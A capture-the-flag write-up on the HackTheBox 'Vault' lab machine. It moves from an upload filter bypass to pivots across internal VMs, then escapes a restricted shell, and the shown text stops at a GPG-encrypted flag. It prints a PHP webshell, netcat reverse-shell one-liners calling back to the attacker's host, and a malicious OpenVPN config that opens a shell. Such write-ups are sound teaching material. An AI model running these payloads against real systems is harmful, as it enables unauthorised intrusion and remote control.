---
title: HTB: Vault
url: https://0xdf.gitlab.io/2019/04/06/htb-vault.html
date: 2019-04-06T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-vault, hackthebox, nmap, gobuster, php, upload, webshell, ssh, credentials, pivot, qemu, spice, openvpn, tunnel, rbash, gpg, remmina, ubuntu, linux, iptables, sudo, filter, oswe-like
---

![Vault-cover](https://0xdfimages.gitlab.io/img/vault-cover.png)

Vault was a a really neat box in that it required pivoting from a host into various VMs to get to the vault, at least the intended way. There’s an initial php upload filter bypass that gives me execution. Then a pivot with an OpenVPN config RCE. From there I’ll find SSH creds, and need to figure out how to pass through a firewall to get to the vault. Once in the vault, I find the flag encrypted with GPG, and I’ll need to move it back to the host to get the decryption keys to get the flag. In Beyond Root, I’ll look at a couple of unintended paths, including a firewall bypass by adding an IP address, and a way to bypass the entire thing by connecting to the Spice ports, rebooting the VMs into recovery, resetting the root password, and then logging in.

## Box Info

| Name | [Vault](https://hackthebox.com/machines/vault)  [Vault](https://hackthebox.com/machines/vault) [Play on HackTheBox](https://hackthebox.com/machines/vault) |
| --- | --- |
| Release Date | [03 Nov 2018](https://twitter.com/hackthebox_eu/status/1057954216269045760) |
| Retire Date | 30 Mar 2019 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Vault |
| Radar Graph | Radar chart for Vault |
| First Blood User | 00:58:41[Kermit Kermit](https://app.hackthebox.com/users/64031) |
| First Blood Root | 04:18:41[Kermit Kermit](https://app.hackthebox.com/users/64031) |
| Creator | [nol0gz nol0gz](https://app.hackthebox.com/users/5621) |

## Recon

### nmap

`nmap` gives only http (80) and ssh (22):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.109
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-04 05:18 EST
Nmap scan report for 10.10.10.109
Host is up (0.019s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.60 seconds

root@kali# nmap -sV -sC -p 22,80 -oA nmap/scripts 10.10.10.109
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-04 05:18 EST
Nmap scan report for 10.10.10.109
Host is up (0.020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect resultsat https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.97 seconds

```

### Website - TCP 80

#### Site

Just some text:

![1541327001907](https://0xdfimages.gitlab.io/img/1541327001907.png)

That same page loads as `/index.php`.

#### gobuster

Since I see the page loads as `index.php`, I’ll search for `php` files, but not find anything new:

```

root@kali# gobuster -u http://10.10.10.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x php

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,html,php
[+] Timeout      : 10s
=====================================================
2018/11/04 05:24:14 Starting gobuster
=====================================================
/index.php (Status: 200)

```

I noticed in the page that it mentions a customer, sparklays. I tried `/sparklays`, and it returns 403 forbidden. I’ll run gobuster again from there:

```

root@kali# gobuster -u http://10.10.10.109/sparklays -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/sparklays/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/03/27 21:13:17 Starting gobuster
=====================================================
/login.php (Status: 200)
/admin.php (Status: 200)
/design (Status: 301)
=====================================================
2018/11/06 09:28:34 Finished
=====================================================

root@kali# gobuster -u http://10.10.10.109/sparklays/design -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html -t 20

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/sparklays/design/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,html
[+] Timeout      : 10s
=====================================================
2019/03/28 06:56:46 Starting gobuster
=====================================================
/uploads (Status: 301)
/design.html (Status: 200)
=====================================================
2018/11/06 09:31:34 Finished
=====================================================

```

#### Deadends

Starting to work through some of the paths I discovered above, `login.php` doesn’t give me much to work with:

![1541516424311](https://0xdfimages.gitlab.io/img/1541516424311.png)

`admin.php` has a login, but nothing I give it seems to generate any response:

![1541516452697](https://0xdfimages.gitlab.io/img/1541516452697.png)

#### changelogo.php

Visiting `http://10.10.10.109/sparklays/design/design.html` gives me another link:

![1541516499447](https://0xdfimages.gitlab.io/img/1541516499447.png)

Following it to `http://10.10.10.109/sparklays/design/changelogo.php` returns an upload form:

![1541516512185](https://0xdfimages.gitlab.io/img/1541516512185.png)

I am able to upload an image, and find it by the same name in `/sparklays/design/uploads/`. If I upload a php file, I get:

![1553772018131](https://0xdfimages.gitlab.io/img/1553772018131.png)

There’s clearly some extension white/blacklisting going on on the server.

## Shell on ubuntu as www-data

### Identify Allowed Extensions

First I need to get past the filters for upload to get my php shell up. If I name my php shell test.png, it uploads, but then errors out when I visit the page. But that tells me that the filtering is on the file name.

Since I don’t have a pro license, I rarely use Burp Intruder, but for a short list on a complex query, this might be a good case. I’ll create a list of exts to check:

```

root@kali# cat exts.txt 
png
jpg
gif
txt
php
ph3
ph4
ph5
php3
php4
php5
png.php

```

Now I’ll find one of my uploads in burp, right click, “send to intruder”.

First I’ll clear all the markers with the clear button, then I’ll find the `filename=test.png`, highlight the png, and click “Add marker”. Now I have this:

![1553772316219](https://0xdfimages.gitlab.io/img/1553772316219.png)

In the payloads tab, I’ll select “Simple list” and then “Load…” and give it my `exts.txt`

![1553772504051](https://0xdfimages.gitlab.io/img/1553772504051.png)

Now I’ll click “Start Attack”. Once I sort the list by length, it’s clear to me that length of 717 is for payloads that are uploaded, and 710 are payloads that are blocked:

![1553772553832](https://0xdfimages.gitlab.io/img/1553772553832.png)

I can select any result and view the request and response below to make sure that’s correct.

### Upload Shell

Based on those result, `php5` will upload, and I know that’s a valid php extension that will likely execute. I’ll save a copy of my simple php webshell:

```

root@kali# cat cmd.php5 
<?php system($_REQUEST['cmd']); ?>

```

I’ll upload it via the webpage:

![1553772732195](https://0xdfimages.gitlab.io/img/1553772732195.png)

And it works:

```

root@kali# curl -s http://10.10.10.109/sparklays/design/uploads/cmd.php5?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Interactive Shell

With the webshell in place, I can get an interactive shell using one of the shells from the [reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

```

root@kali# curl -s 'http://10.10.10.109/sparklays/design/uploads/cmd.php5?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.14%20443%20%3E/tmp/f'

```

And I get a callback:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.109.
Ncat: Connection from 10.10.10.109:60300.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Shell on ubuntu as dave

### Enumeration

In looking around, I have access to the home directory of dave, and there’s three interesting files on this desktop.

```

www-data@ubuntu:/home/dave/Desktop$ ls -l
total 12
-rw-rw-r-- 1 alex alex 74 Jul 17 10:30 Servers
-rw-rw-r-- 1 alex alex 14 Jul 17 10:31 key
-rw-rw-r-- 1 alex alex 20 Jul 17 10:31 ssh

```

`Servers` has a list of servers, and just based on the “x” and the hostname, I’m guessing I need to get to vault:

```

www-data@ubuntu:/home/dave/Desktop$ cat Servers
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x

```

`key` has a single string, which I’ll note for later:

```

www-data@ubuntu:/home/dave/Desktop$ cat key
itscominghome

```

`ssh` has what I can guess is a username and password:

```

www-data@ubuntu:/home/dave/Desktop$ cat ssh
dave
Dav3therav3123

```

### su

I can test the creds with `su`, and it works:

```

www-data@ubuntu:/home/dave/Desktop$ su dave
Password: 
dave@ubuntu:~/Desktop$

```

### ssh

I can also now ssh into the box as dave:

```

root@kali# ssh dave@10.10.10.109
dave@10.10.10.109's password:                                         
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-45-generic x86_64)    
 * Documentation:  https://help.ubuntu.com                            
 * Management:     https://landscape.canonical.com                    
 * Support:        https://ubuntu.com/advantage                       

222 packages can be updated.                                          
47 updates are security updates.                                                            

Last login: Tue Nov  6 06:32:17 2018 from 10.10.14.10                 
dave@ubuntu:~$

```

## Network Enumeration

### Host Identification

I know there are hosts in the 192.168.122.0/24 range. I can see that my current host is the .1:

```

dave@ubuntu:~/Desktop$ ifconfig virbr0
virbr0    Link encap:Ethernet  HWaddr fe:54:00:17:ab:49  
          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:7780 errors:0 dropped:0 overruns:0 frame:0
          TX packets:9856 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:2097860 (2.0 MB)  TX bytes:883044 (883.0 KB)

```

I’ll kick off a ping sweep and instantly find two additional hosts:

```

dave@ubuntu:~/Desktop$ time for i in $(seq 1 254); do (ping -c 1 192.168.122.${i} | grep "bytes from" &); done
64 bytes from 192.168.122.1: icmp_seq=1 ttl=64 time=0.051 ms
64 bytes from 192.168.122.4: icmp_seq=1 ttl=64 time=0.205 ms
64 bytes from 192.168.122.5: icmp_seq=1 ttl=64 time=1.05 ms

real    0m0.286s
user    0m0.159s
sys     0m0.075s

```

From the note above, I know that .4 is “DNS + Configurator” and .5 is the “Firewall”.

### Firewall

I’ll start a port scan on the .5 host using `nc`. It take a bit longer to complete, and doesn’t find anything.

```

dave@ubuntu:~$ time for i in $(seq 1 65535); do (nc -zvn 192.168.122.5 ${i} 2>&1 | grep -v "Connection refused" &); done                                                                                                   

real    20m4.802s
user    2m49.629s
sys     6m47.633s

```

This is not surprising for a firewall.

### DNS + Configurator

At the same time in another ssh session, I’ll start a port scan on the .4. The two open ports return almost immediately:

```

dave@ubuntu:~/Desktop$ time for i in $(seq 1 65535); do (nc -zvn 192.168.122.4 ${i} 2>&1 | grep -v "Connection refused" &); done                                                                                           
Connection to 192.168.122.4 22 port [tcp/*] succeeded!
Connection to 192.168.122.4 80 port [tcp/*] succeeded!

real    20m37.665s
user    3m9.019s
sys     7m6.815s

```

## Shell on DNS as root

### Enumeration

I try my existing creds to ssh into DNS, but they fail.

Now I turn to web. I’ll create a [port forward over ssh](/cheatsheets/tunneling) so I can access the page via my browser. Since I’m already in an ssh session as dave, I’ll just enter `[enter]~C` to drop into ssh config mode. Then I’ll create my tunnel:

```

ssh> -D 8081
Forwarding port.

```

Now I can configure my proxy to point to localhost:8081. I could do this in FoxyProxy or in Burp. Since I’m already going through Burp, I’ll add it there, under the “User options” tab:

![1553779743951](https://0xdfimages.gitlab.io/img/1553779743951.png)

While that’s checked, any traffic going through Burp will then proxy through my ssh tunnel.

Now I can visit `http://192.168.122.4/` and get:

![1553779272175](https://0xdfimages.gitlab.io/img/1553779272175.png)

The first think to `dns-config.php` is not found.

The second link to `vpnconfig.php` displays a page:

![1553779324606](https://0xdfimages.gitlab.io/img/1553779324606.png)

If I click “Test VPN”, it directs to `http://192.168.122.4/vpnconfig.php?function=testvpn` and prints “executed succesfully!” (typo in successfully) at the top.

### OpenVPN RCE

There’s a way to get [RCE through a OpenVPN config](https://www.bleepingcomputer.com/news/security/downloading-3rd-party-openvpn-configs-may-be-dangerous-heres-why/). The short description is that a config can contain an `up` entry which is the command to execute after the connection is made.

### Shell

I’ll craft a malicious OpenVPN config file as follows:

```

remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 8181 >/tmp/f'"
nobind

```

Now I’ll start a listener on my ssh session, upload the config, and hit “Test”:

```

dave@ubuntu:~$ nc -lnvp 8181
Listening on [0.0.0.0] (family 0, port 8181)
Connection from [192.168.122.4] port 8181 [tcp/*] accepted (family 2, sport 53392)
bash: cannot set terminal process group (1088): Inappropriate ioctl for device
bash: no job control in this shell
root@DNS:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)

```

In the dave homedir, I’ll find `user.txt`:

```

root@DNS:/home/dave# cat user.txt
a4947faa...

```

### ssh

I’ll also find another `ssh` file, with new creds:

```

root@DNS:/home/dave# cat ssh
dave
dav3gerous567

```

I can ssh in as dave:

```

dave@ubuntu:~$ ssh dave@192.168.122.4
dave@192.168.122.4's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

98 packages can be updated.
50 updates are security updates.

Last login: Thu Mar 28 13:04:43 2019 from 192.168.122.1
dave@DNS:~$

```

dave can also `sudo`, so I can get back to root if I want:

```

dave@DNS:~$ sudo -l
[sudo] password for dave:
Matching Defaults entries for dave on DNS:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on DNS:
    (ALL : ALL) ALL
    
dave@DNS:~$ sudo su
[sudo] password for dave: 

root@DNS:/home/dave#

```

## Shell vault as dave

### Local Enumeration

I checked out the `.bash_history` files for root, dave, and alex. root and dave weren’t interesting, but I did see this in alex’s:

```

ping 192.168.5.2

```

That’s a new address I haven’t seen yet.

I want to check if that IP showed up in any of the logs, so I’ll run a `grep`. `-r` searches all files in the given path (in this case `/var/log`):

```

root@DNS:/# grep -r "192.168.5.2" /var/log
Binary file /var/log/auth.log matches
Binary file /var/log/btmp matches

```

I can use the `-a` flag on grep to display the match on a binary file, and `-H` to ensure the file names are printed:

```

root@DNS:/var/log# grep -rHa "192.168.5.2" /var/log
/var/log/auth.log:Jul 17 16:49:01 DNS sshd[1912]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:Jul 17 16:49:02 DNS sshd[1943]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:Jul 17 16:49:02 DNS sshd[1943]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:Jul 17 17:21:38 DNS sshd[1560]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:Jul 17 17:21:38 DNS sshd[1590]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:Jul 17 17:21:38 DNS sshd[1590]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:Jul 17 21:58:26 DNS sshd[1171]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:Jul 17 21:58:29 DNS sshd[1249]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:Jul 17 21:58:29 DNS sshd[1249]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:Jul 24 15:06:10 DNS sshd[1466]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:Jul 24 15:06:10 DNS sshd[1496]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:Jul 24 15:06:10 DNS sshd[1496]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:Jul 24 15:06:26 DNS sshd[1500]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.5.2  user=dave
/var/log/auth.log:Jul 24 15:06:28 DNS sshd[1500]: Failed password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:Jul 24 15:06:28 DNS sshd[1500]: Connection closed by 192.168.5.2 port 4444 [preauth]
/var/log/auth.log:Jul 24 15:06:57 DNS sshd[1503]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:Jul 24 15:06:57 DNS sshd[1533]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:Jul 24 15:06:57 DNS sshd[1533]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:Jul 24 15:07:21 DNS sshd[1536]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:Jul 24 15:07:21 DNS sshd[1566]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:Jul 24 15:07:21 DNS sshd[1566]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
/var/log/auth.log:Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
/var/log/auth.log:Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
N[z<ssh:nottyalex192.168.122.1N[z<ssh:nottyalex192.168.122.1N[zssh:nottydave192.168.122.1N[zssh:nottydave192.168.5.2d2W[ssh:nottydave192.168.122.17W[zssh:nottydave192.168.122.18W[zssh:nottydave192.168.122.18W[zssh:nottydtty1tty1davem9[ܧ]ssh:nottydave192.168.122.1@[zcssh:nottydave192.168.122.1T[zP

```

There’s a bunch of activity on July 17 and 24 that looks like ssh on port 4444.

There’s more interesting stuff on September 2 where the following three commands are run:

```

/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53

```

### Vault Enumeration

Since `nmap` is installed on the host, I’ll run the same command to scan .2 without setting the source port, and get back everything is closed:

```

root@DNS:/var/log# nmap 192.168.5.2 -Pn -f

Starting Nmap 7.01 ( https://nmap.org ) at 2019-03-28 14:05 GMT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0042s latency).
Not shown: 998 filtered ports
PORT     STATE  SERVICE
53/tcp   closed domain
4444/tcp closed krb524

Nmap done: 1 IP address (1 host up) scanned in 15.19 seconds

```

I can actually show why 53 and 4444 report closed when everything else doesn’t at the end of [Beyond Root](#firewall-rules).

When I add in the `--source-port=4444`, I get back different results:

```

root@DNS:/var/log# nmap 192.168.5.2 -Pn -f --source-port=4444

Starting Nmap 7.01 ( https://nmap.org ) at 2019-03-28 14:09 GMT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0038s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE
987/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.84 seconds

```

Based on the other two interesting commands, I’ll see that setting the source to port 53 gives the same results:

```

root@DNS:/var/log# nmap 192.168.5.2 -Pn -f --source-port=53

Starting Nmap 7.01 ( https://nmap.org ) at 2019-03-28 14:10 GMT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0032s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE
987/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 25.04 seconds

```

I can see what’s listening on 987 with `nc`:

```

root@DNS:/var/log# nc 192.168.5.2 987 -p 53
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4

```

### ssh

`ssh` doesn’t come with an option to set a source port. However, that brings me to the next two interesting commands from `auth.log`:

```

/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53

```

I’ll look at the first command. It is running [ncat](http://man7.org/linux/man-pages/man1/ncat.1.html) listening on port 1234. `--sh-exec` allows `ncat` to execute the next command with `/bin/sh` and connect its stdin to stdout from the original listener. So in this case, I end us with a listener on 1234, and input is passed to another `ncat` that is connected to 192.168.5.2:987 using source port 53. That means once I set this up, I can then ssh to localhost port 1234, and it will connect me through to vault.

Start the tunnel in the background:

```

root@DNS:/var/log# /usr/bin/ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53" &
[1] 1449

```

Now connect with ssh, and use dave’s dns password:

```

root@DNS:/var/log# ssh dave@localhost -p 1234
The authenticity of host '[localhost]:1234 ([::1]:1234)' can't be established.
ECDSA key fingerprint is SHA256:Wo70Zou+Hq5m/+G2vuKwUnJQ4Rwbzlqhq2e1JBdjEsg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[localhost]:1234' (ECDSA) to the list of known hosts.
dave@localhost's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

96 packages can be updated.
49 updates are security updates.

Last login: Mon Sep  3 16:48:00 2018
dave@vault:~$

```

### rbash

I find myself in a restricted `rbash` shell:

```

dave@vault:~$ cd /
-rbash: cd: restricted

```

But that’s easily escaped by sshing in with `-t bash`:

```

root@DNS:/var/log# /usr/bin/ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53" &
[1] 1453
root@DNS:/var/log# ssh dave@localhost -p 1234 -t bash
dave@localhost's password:
dave@vault:~$ cd /
dave@vault:/$

```

## root.txt.gpg

In dave’s home dir on vault there’s a file:

```

dave@vault:~$ ls
root.txt.gpg

```

gpg relies on the key stored in the local keyring. I’ll attempt to decrypt it on vault, knowing that’s too easy to succeed:

```

dave@vault:~$ gpg -d root.txt.gpg
gpg: encrypted with RSA key, ID D1EB1F03
gpg: decryption failed: secret key not available

```

I’ll try to move the file to other machines. `base64` appears to not be on the vault, but `base32` is:

```

dave@vault:~$ base32 -w0 root.txt.gpg 
QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY=

```

I’ll drop back to dns and create the file:

```

root@DNS:/dev/shm# echo QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY= | base32 -d > a.gpg

root@DNS:/dev/shm# file a.gpg 
a.gpg: PGP RSA encrypted session key - keyid: 10C678C7 31FEBD1 RSA (Encrypt or Sign) 4096b .

```

Tried to decrypt as both root and dave:

```

dave@DNS:~$ gpg -d /dev/shm/a.gpg 
gpg: encrypted with RSA key, ID D1EB1F03
gpg: decryption failed: secret key not available

```

```

root@DNS:~# file /dev/shm/a.gpg 
a.gpg: PGP RSA encrypted session key - keyid: 10C678C7 31FEBD1 RSA (Encrypt or Sign) 4096b .
root@DNS:/dev/shm# gpg -d a.gpg 
gpg: directory `/root/.gnupg' created
gpg: new configuration file `/root/.gnupg/gpg.conf' created
gpg: WARNING: options in `/root/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/root/.gnupg/secring.gpg' created
gpg: keyring `/root/.gnupg/pubring.gpg' created
gpg: encrypted with RSA key, ID D1EB1F03
gpg: decryption failed: secret key not available

```

Now I’ll drop back to the original host.

```

